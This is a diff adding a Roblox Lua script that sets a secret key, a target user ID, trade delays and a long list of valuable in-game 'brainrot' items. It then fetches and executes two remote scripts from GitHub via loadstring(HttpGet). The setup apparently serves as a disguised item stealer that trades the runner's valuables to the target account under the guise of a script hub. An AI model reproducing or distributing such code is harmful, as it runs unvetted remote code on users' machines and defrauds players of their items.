@@ -1,0 +1,64 @@
+getgenv().SECRET_KEY = "mrr_007d378d418f47eeafe379d62c730ce9"
+getgenv().TARGET_ID = 6219924104
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Love Love Bear"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Hydra Bunny"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Arcadragon"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Los Amigos"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Los Sekolahs"] = true,
+    ["Signore Carapace"] = true,
+    ["La Casa Boo"] = true,
+    ["Cash or Card"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Food Combinasion"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Ginger Gerat"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Festive 67"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Antonio"] = true,
+    ["Garama and Madundung"] = true,
+    ["Fishino Clownino"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Swaggy Bros"] = true,
+    ["Chillin Chili"] = true,
+    ["Los Chillis"] = true,
+    ["Digi Narwhal"] = true,
+    ["Kalika Bros"] = true,
+    ["Gym Bros"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Centrucci Nuclucci"] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cratos-Dev/LimitedHub/refs/heads/main/Limited"))()
+end)
+task.spawn(function()
+loadstring(Game:HttpGet("https://raw.githubusercontent.com/illusionxlsqr/Illusion-hub-old/refs/heads/main/Freeversion"))()
+end) 
